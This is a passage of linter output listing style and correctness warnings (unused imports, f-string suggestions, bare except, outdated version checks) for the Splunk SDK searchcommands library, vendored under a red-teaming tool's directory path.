F403 `from .environment import *` used; unable to detect undefined names
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:146:1
    |
145 | from .decorators import *
146 | from .environment import *
    | ^^^^^^^^^^^^^^^^^^^^^^^^^^
147 | from .eventing_command import EventingCommand
148 | from .external_search_command import ExternalSearchCommand, execute
    |

F401 `.eventing_command.EventingCommand` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:147:31
    |
145 | from .decorators import *
146 | from .environment import *
147 | from .eventing_command import EventingCommand
    |                               ^^^^^^^^^^^^^^^
148 | from .external_search_command import ExternalSearchCommand, execute
149 | from .generating_command import GeneratingCommand
    |
help: Use an explicit re-export: `EventingCommand as EventingCommand`

F401 `.external_search_command.ExternalSearchCommand` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:148:38
    |
146 | from .environment import *
147 | from .eventing_command import EventingCommand
148 | from .external_search_command import ExternalSearchCommand, execute
    |                                      ^^^^^^^^^^^^^^^^^^^^^
149 | from .generating_command import GeneratingCommand
150 | from .reporting_command import ReportingCommand
    |
help: Use an explicit re-export: `ExternalSearchCommand as ExternalSearchCommand`

F401 `.external_search_command.execute` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:148:61
    |
146 | from .environment import *
147 | from .eventing_command import EventingCommand
148 | from .external_search_command import ExternalSearchCommand, execute
    |                                                             ^^^^^^^
149 | from .generating_command import GeneratingCommand
150 | from .reporting_command import ReportingCommand
    |
help: Use an explicit re-export: `execute as execute`

F401 `.generating_command.GeneratingCommand` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:149:33
    |
147 | from .eventing_command import EventingCommand
148 | from .external_search_command import ExternalSearchCommand, execute
149 | from .generating_command import GeneratingCommand
    |                                 ^^^^^^^^^^^^^^^^^
150 | from .reporting_command import ReportingCommand
151 | from .search_command import SearchMetric, dispatch
    |
help: Use an explicit re-export: `GeneratingCommand as GeneratingCommand`

F401 `.reporting_command.ReportingCommand` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:150:32
    |
148 | from .external_search_command import ExternalSearchCommand, execute
149 | from .generating_command import GeneratingCommand
150 | from .reporting_command import ReportingCommand
    |                                ^^^^^^^^^^^^^^^^
151 | from .search_command import SearchMetric, dispatch
152 | from .streaming_command import StreamingCommand
    |
help: Use an explicit re-export: `ReportingCommand as ReportingCommand`

F401 `.search_command.SearchMetric` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:151:29
    |
149 | from .generating_command import GeneratingCommand
150 | from .reporting_command import ReportingCommand
151 | from .search_command import SearchMetric, dispatch
    |                             ^^^^^^^^^^^^
152 | from .streaming_command import StreamingCommand
153 | from .validators import *
    |
help: Use an explicit re-export: `SearchMetric as SearchMetric`

F401 `.search_command.dispatch` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:151:43
    |
149 | from .generating_command import GeneratingCommand
150 | from .reporting_command import ReportingCommand
151 | from .search_command import SearchMetric, dispatch
    |                                           ^^^^^^^^
152 | from .streaming_command import StreamingCommand
153 | from .validators import *
    |
help: Use an explicit re-export: `dispatch as dispatch`

F401 `.streaming_command.StreamingCommand` imported but unused; consider removing, adding to `__all__`, or using a redundant alias
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:152:32
    |
150 | from .reporting_command import ReportingCommand
151 | from .search_command import SearchMetric, dispatch
152 | from .streaming_command import StreamingCommand
    |                                ^^^^^^^^^^^^^^^^
153 | from .validators import *
    |
help: Use an explicit re-export: `StreamingCommand as StreamingCommand`

F403 `from .validators import *` used; unable to detect undefined names
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\__init__.py:153:1
    |
151 | from .search_command import SearchMetric, dispatch
152 | from .streaming_command import StreamingCommand
153 | from .validators import *
    | ^^^^^^^^^^^^^^^^^^^^^^^^^
    |

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib import six
   |
help: Remove unnecessary `__future__` import

UP004 [*] Class `Configuration` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:34:21
   |
34 | class Configuration(object):
   |                     ^^^^^^
35 |     """Defines the configuration settings for a search command.
   |
help: Remove `object` inheritance

F523 [*] `.format` call has unused arguments at position(s): 1
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:93:17
   |
91 |           else:
92 |               raise TypeError(
93 | /                 "Incorrect usage: Configuration decorator applied to {0}".format(
94 | |                     type(o), o.__name__
95 | |                 )
   | |_________________^
96 |               )
   |
help: Remove extra positional arguments at position(s): 1

UP030 Use implicit references for positional format fields
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:93:17
   |
91 |           else:
92 |               raise TypeError(
93 | /                 "Incorrect usage: Configuration decorator applied to {0}".format(
94 | |                     type(o), o.__name__
95 | |                 )
   | |_________________^
96 |               )
   |
help: Remove explicit positional indices

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:93:17
   |
91 |           else:
92 |               raise TypeError(
93 | /                 "Incorrect usage: Configuration decorator applied to {0}".format(
94 | |                     type(o), o.__name__
95 | |                 )
   | |_________________^
96 |               )
   |
help: Convert to f-string

E731 Do not assign a `lambda` expression, use a `def`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:153:9
    |
151 |       def fix_up(cls, values):
152 |
153 | /         is_configuration_setting = lambda attribute: isinstance(
154 | |             attribute, ConfigurationSetting
155 | |         )
    | |_________^
156 |           definitions = getmembers(cls, is_configuration_setting)
157 |           i = 0
    |
help: Rewrite `is_configuration_setting` as a `def`

B023 Function definition does not bind loop variable `value`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:185:70
    |
183 |                     def fset(bfn, validate, specification, name):
184 |                         return lambda this, value: setattr(
185 |                             this, bfn, validate(specification, name, value)
    |                                                                      ^^^^^
186 |                         )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:220:21
    |
218 |             if setting.fset is None:
219 |                 raise ValueError(
220 |                     "The value of configuration setting {} is fixed".format(name)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
221 |                 )
    |
help: Convert to f-string

C414 Unnecessary `list()` call within `sorted()`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:227:24
    |
226 |         if len(values) > 0:
227 |             settings = sorted(list(six.iteritems(values)))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
228 |             settings = imap(lambda n_v: "{}={}".format(n_v[0], repr(n_v[1])), settings)
229 |             raise AttributeError(
    |
help: Remove the inner `list()` call

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:228:41
    |
226 |         if len(values) > 0:
227 |             settings = sorted(list(six.iteritems(values)))
228 |             settings = imap(lambda n_v: "{}={}".format(n_v[0], repr(n_v[1])), settings)
    |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
229 |             raise AttributeError(
230 |                 "Inapplicable configuration settings: " + ", ".join(settings)
    |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:248:13
    |
246 |               specification = ConfigurationSettingsType.specification_matrix[name]
247 |           except KeyError:
248 | /             raise AttributeError(
249 | |                 "Unknown configuration setting: {}={}".format(name, repr(self._value))
250 | |             )
    | |_____________^
251 |
252 |           return ConfigurationSettingsType.validate_configuration_setting, specification
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:249:17
    |
247 |         except KeyError:
248 |             raise AttributeError(
249 |                 "Unknown configuration setting: {}={}".format(name, repr(self._value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
250 |             )
    |
help: Convert to f-string

E731 Do not assign a `lambda` expression, use a `def`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:343:9
    |
341 |     def fix_up(cls, command_class):
342 |
343 |         is_option = lambda attribute: isinstance(attribute, Option)
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
344 |         definitions = getmembers(command_class, is_option)
345 |         validate_option_name = OptionName()
    |
help: Rewrite `is_option` as a `def`

SIM113 Use `enumerate()` for index variable `i` in `for` loop
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:380:13
    |
379 |             definitions[i] = name, option
380 |             i += 1
    |             ^^^^^^
381 |
382 |         command_class.option_definitions = definitions
    |

UP004 [*] Class `Item` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\decorators.py:395:16
    |
393 |     # region Types
394 |
395 |     class Item(object):
    |                ^^^^^^
396 |         """Presents an instance/class view over a search command `Option`.
    |
help: Remove `object` inheritance

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\environment.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\environment.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | import sys
   |
help: Remove unnecessary `__future__` import

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\environment.py:96:17
    |
 94 |           if not found:
 95 |               raise ValueError(
 96 | /                 'Logging configuration file "{}" not found in local or default directory'.format(
 97 | |                     filename
 98 | |                 )
    | |_________________^
 99 |               )
100 |       elif not path.exists(filename):
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\environment.py:101:26
    |
 99 |             )
100 |     elif not path.exists(filename):
101 |         raise ValueError('Logging configuration file "{}" not found'.format(filename))
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
102 |
103 |     if filename is not None:
    |
help: Convert to f-string

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\eventing_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\eventing_command.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib.six.moves import map as imap
   |
help: Remove unnecessary `__future__` import

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | import os
   |
help: Remove unnecessary `__future__` import

UP004 [*] Class `ExternalSearchCommand` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:36:29
   |
36 | class ExternalSearchCommand(object):
   |                             ^^^^^^
37 |     """ """
   |
help: Remove `object` inheritance

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:43:17
   |
41 |         if not isinstance(path, (bytes, six.text_type)):
42 |             raise ValueError(
43 |                 "Expected a string value for path, not {}".format(repr(path))
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
44 |             )
   |
help: Convert to f-string

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:58:16
   |
56 |     @property
57 |     def argv(self):
58 |         return getattr(self, "_argv")
   |                ^^^^^^^^^^^^^^^^^^^^^^
59 |
60 |     @argv.setter
   |
help: Replace `getattr` with attribute access

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:64:17
   |
62 |           if not (value is None or isinstance(value, (list, tuple))):
63 |               raise ValueError(
64 | /                 "Expected a list, tuple or value of None for argv, not {}".format(
65 | |                     repr(value)
66 | |                 )
   | |_________________^
67 |               )
68 |           self._argv = value
   |
help: Convert to f-string

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:72:16
   |
70 |     @property
71 |     def environ(self):
72 |         return getattr(self, "_environ")
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^
73 |
74 |     @environ.setter
   |
help: Replace `getattr` with attribute access

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:78:17
   |
76 |         if not (value is None or isinstance(value, dict)):
77 |             raise ValueError(
78 |                 "Expected a dictionary value for environ, not {}".format(repr(value))
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
79 |             )
80 |         self._environ = value
   |
help: Convert to f-string

E722 Do not use bare `except`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:100:9
    |
 98 |                 self._argv = os.path.splitext(os.path.basename(self._path))[0]
 99 |             self._execute(self._path, self._argv, self._environ)
100 |         except:
    |         ^^^^^^
101 |             error_type, error, tb = sys.exc_info()
102 |             message = "Command execution failed: " + six.text_type(error)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:134:34
    |
133 |             if found is None:
134 |                 raise ValueError("Cannot find command on path: {}".format(path))
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
135 |
136 |             path = found
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\external_search_command.py:141:21
    |
139 |               def terminate(signal_number, frame):
140 |                   sys.exit(
141 | /                     "External search command is terminating on receipt of signal={}.".format(
142 | |                         signal_number
143 | |                     )
    | |_____________________^
144 |                   )
    |
help: Convert to f-string

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\generating_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\generating_command.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function, unicode_literals
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from splunklib.six.moves import filter as ifilter
   |
help: Remove unnecessary `__future__` import

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\generating_command.py:217:36
    |
216 |             if action != "execute":
217 |                 raise RuntimeError("Expected execute action, not {}".format(action))
    |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
218 |
219 |         self._record_writer.write_records(self.generate())
    |
help: Convert to f-string

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:17:1
   |
15 | # under the License.
16 |
17 | from __future__ import absolute_import, division, print_function
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | from collections import deque, namedtuple
   |
help: Remove unnecessary `__future__` import

F821 Undefined name `file`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:53:65
   |
51 |     For python2+windows we want to set os.O_BINARY
52 |     """
53 |     typefile = TextIOWrapper if sys.version_info >= (3, 0) else file
   |                                                                 ^^^^
54 |     # check for file handle
55 |     if not isinstance(fh, typefile):
   |

UP036 Version block is outdated for minimum Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:62:10
   |
60 |         return fh.buffer
61 |     # check for python3
62 |     elif sys.version_info >= (3, 0):
   |          ^^^^^^^^^^^^^^^^^^^^^^^^^^
63 |         pass
64 |     # check for windows python2. SPL-175233 -- python3 stdout is already binary
   |
help: Remove outdated version block

UP004 [*] Class `CommandLineParser` inherits from `object`
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:81:25
   |
81 | class CommandLineParser(object):
   |                         ^^^^^^
82 |     """Parses the arguments to a search command.
   |
help: Remove `object` inheritance

W605 [*] Invalid escape sequence: `\w`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:108:51
    |
106 |     **Example:**
107 |
108 |     countmatches fieldname = word_count pattern = \w+ some_text_field
    |                                                   ^^
109 |
110 |     Option names are mapped to properties in the targeted ``SearchCommand``. It is the responsibility of the property
    |
help: Add backslash to escape sequence

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:155:31
    |
154 |         if command_args is None:
155 |             raise SyntaxError("Syntax error: {}".format(argv))
    |                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
156 |
157 |         # Parse options
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:163:21
    |
161 |               if name not in command.options:
162 |                   raise ValueError(
163 | /                     "Unrecognized {} command option: {}={}".format(
164 | |                         command.name, name, json_encode_string(value)
165 | |                     )
    | |_____________________^
166 |                   )
167 |               command.options[name].value = cls.unquote(value)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:179:17
    |
177 |                   )
178 |               raise ValueError(
179 | /                 "A value for {} command option {} is required".format(
180 | |                     command.name, missing[0]
181 | |                 )
    | |_________________^
182 |               )
    |
help: Convert to f-string

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:294:20
    |
293 |     def __new__(mcs, module, name, bases):
294 |         mcs = super(ConfigurationSettingsType, mcs).__new__(mcs, str(name), bases, {})
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
295 |         return mcs
    |
help: Remove `super()` parameters

UP008 [*] Use `super()` instead of `super(__class__, self)`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:299:14
    |
297 |     def __init__(cls, module, name, bases):
298 |
299 |         super(ConfigurationSettingsType, cls).__init__(name, bases, None)
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
300 |         cls.__module__ = module
    |
help: Remove `super()` parameters

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:310:17
    |
308 |                 type_names = ", ".join(imap(lambda t: t.__name__, specification.type))
309 |             raise ValueError(
310 |                 "Expected {} value, not {}={}".format(type_names, name, repr(value))
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
311 |             )
312 |         if specification.constraint and not specification.constraint(value):
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:313:30
    |
311 |             )
312 |         if specification.constraint and not specification.constraint(value):
313 |             raise ValueError("Illegal value: {}={}".format(name, repr(value)))
    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
314 |         return value
    |
help: Convert to f-string

UP004 [*] Class `ObjectView` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:457:18
    |
457 | class ObjectView(object):
    |                  ^^^^^^
458 |
459 |     def __init__(self, dictionary):
    |
help: Remove `object` inheritance

UP004 [*] Class `Recorder` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:469:16
    |
469 | class Recorder(object):
    |                ^^^^^^
470 |
471 |     def __init__(self, path, f):
    |
help: Remove `object` inheritance

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:472:27
    |
471 |     def __init__(self, path, f):
472 |         self._recording = gzip.open(path + ".gz", "wb")
    |                           ^^^^^^^^^
473 |         self._file = f
    |

UP004 [*] Class `RecordWriter` inherits from `object`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:507:20
    |
507 | class RecordWriter(object):
    |                    ^^^^^^
508 |
509 |     def __init__(self, ofile, maxresultrows=None):
    |
help: Remove `object` inheritance

SIM210 Use `bool(...)` instead of `True if ... else False`
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:532:25
    |
530 |     @is_flushed.setter
531 |     def is_flushed(self, value):
532 |         self._flushed = True if value else False
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^
533 |
534 |     @property
    |
help: Replace with `bool(...)

UP018 [*] Unnecessary `str` call (rewrite as a literal)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:589:52
    |
587 |         if fieldnames is None:
588 |             self._fieldnames = fieldnames = list(record.keys())
589 |             value_list = imap(lambda fn: (str(fn), str("__mv_") + str(fn)), fieldnames)
    |                                                    ^^^^^^^^^^^^
590 |             self._writerow(list(chain.from_iterable(value_list)))
    |
help: Replace with string literal

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:810:24
    |
808 |                   finished = False
809 |
810 |               metadata = [
    |  ________________________^
811 | |                 item for item in (("inspector", inspector), ("finished", finished))
812 | |             ]
    | |_____________^
813 |               self._write_chunk(metadata, self._buffer.getvalue())
814 |               self._clear()
    |
help: Rewrite using `list()`

C404 Unnecessary list comprehension (rewrite as a dict comprehension)
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:846:25
    |
844 |                 "".join(
845 |                     self._iterencode_json(
846 |                         dict([(n, v) for n, v in metadata if v is not None]), 0
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
847 |                     )
848 |                 )
    |
help: Rewrite as a dict comprehension

UP036 Version block is outdated for minimum Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:850:16
    |
848 |                 )
849 |             )
850 |             if sys.version_info >= (3, 0):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^
851 |                 metadata = metadata.encode("utf-8")
852 |             metadata_length = len(metadata)
    |
help: Remove outdated version block

UP036 Version block is outdated for minimum Python version
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:856:12
    |
854 |             metadata_length = 0
855 |
856 |         if sys.version_info >= (3, 0):
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^
857 |             body = body.encode("utf-8")
858 |         body_length = len(body)
    |
help: Remove outdated version block

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\internals.py:863:22
    |
861 |             return
862 |
863 |         start_line = "chunked 1.0,%s,%s\n" % (metadata_length, body_length)
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
864 |         self.write(start_line)
865 |         self.write(metadata)
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\reporting_command.py:1:1
  |
1 | # coding=utf-8
  | ^^^^^^^^^^^^^^
2 | #
3 | # Copyright ┬⌐ 2011-2015 Splunk, Inc.
  |
help: Remove unnecessary coding comment

UP010 [*] Unnecessary `__future__` imports `absolute_import`, `division`, `print_function`, `unicode_literals` for target Python version
  --> security\penetration-testing-tools\red-teaming\CobaltSplunk\cobalt\lib\splunklib\searchcommands\reporting_command.py:17:1
   |
